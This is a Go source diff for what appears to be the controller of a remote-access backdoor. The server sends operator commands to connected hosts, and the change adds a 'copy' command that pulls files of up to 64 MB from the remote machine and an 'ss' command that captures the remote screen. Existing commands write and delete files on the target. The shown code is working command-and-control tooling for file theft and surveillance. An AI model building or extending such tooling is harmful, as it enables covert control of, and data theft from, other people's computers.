@@ -44,20 +44,14 @@ func startServer(port string) (ln net.Listener) {
 
 func handleClient(conn net.Conn) {
 	var addr string = conn.RemoteAddr().String()
-	var buf []byte
+	var data []byte
 
 	fmt.Printf("\n    #### Host connected: %v ####\n\n", addr)
 
 	for {
 		conn.Write([]byte("pwd"))
-
-		buf = make([]byte, 1024)
-		_, err := conn.Read(buf)
-		if err != nil {
-			log.Fatalf("Read error: %v", err)
-		}
-		buf = bytes.Trim(buf, "\x00")
-		fmt.Printf("%s>", buf)
+		data = readConn(conn, 1024)
+		fmt.Printf("%s>", data)
 
 		scanner := bufio.NewScanner(os.Stdin)
 		scanner.Scan()
@@ -66,21 +60,25 @@ func handleClient(conn net.Conn) {
 			log.Fatalf("Scanner error: %v\n", err)
 		}
 
-		if scanner.Text() != "" {
-			if scanner.Text() != "help" {
-				conn.Write([]byte(scanner.Text()))
+		input := scanner.Text()
+		cmd, args, _ := strings.Cut(input, " ")
 
-				buf = make([]byte, 1024)
-				_, err = conn.Read(buf)
-				if err != nil {
-					log.Fatalf("Read error: %v", err)
-				}
-				buf = bytes.Trim(buf, "\x00")
-				fmt.Printf("%s\n", buf)
+		switch {
+		case cmd == "":
+		case cmd == "help":
+			printCmdList()
 
-			} else {
-				printCmdList()
-			}
+		case cmd == "copy":
+			conn.Write([]byte(input))
+			writeBytesToFile(args, readConn(conn, 67108864))
+
+		case cmd == "ss":
+			conn.Write([]byte(input))
+			writeBytesToFile("screenshot.png", readConn(conn, 67108864))
+
+		default:
+			conn.Write([]byte(input))
+			fmt.Printf("%s\n", readConn(conn, 1024))
 		}
 	}
 }
@@ -97,6 +95,8 @@ func printCmdList() {
 		{"write", "Writes text to the specified file."},
 		{"display", "Writes text to the specified file and opens the file."},
 		{"remove", "Removes the specified file."},
+		{"copy", "Copies the specified file."},
+		{"ss", "Screenshots and saves the file."},
 	}
 
 	fmt.Print("\n")
@@ -106,10 +106,40 @@ func printCmdList() {
 	fmt.Print("\n")
 }
 
+func readConn(conn net.Conn, size int) (data []byte) {
+	data = make([]byte, size)
+	_, err := conn.Read(data)
+	if err != nil {
+		log.Fatalf("Read error: %v\n", err)
+	}
+
+	data = bytes.Trim(data, "\x00")
+	return data
+}
+
+func writeBytesToFile(filename string, data []byte) {
+	file, err := os.Create(filename)
+	if err != nil {
+		log.Fatalf("Create error: %v\n", err)
+	}
+
+	_, err = file.Write(data)
+	if err != nil {
+		log.Fatalf("Write error: %v\n", err)
+	}
+
+	err = file.Close()
+	if err != nil {
+		log.Fatalf("Close error: %v\n", err)
+	}
+
+	fmt.Printf("Written bytes to %v successfully.\n", filename)
+}
+
 func readConfig(name string) (config [][]string) {
 	data, err := os.ReadFile(name)
 	if err != nil {
-		log.Fatalf("read error: %v\n", err)
+		log.Fatalf("Read config error: %v\n", err)
 	}
 
 	lines := strings.Split(strings.ReplaceAll(string(data), "\r", ""), "\n")
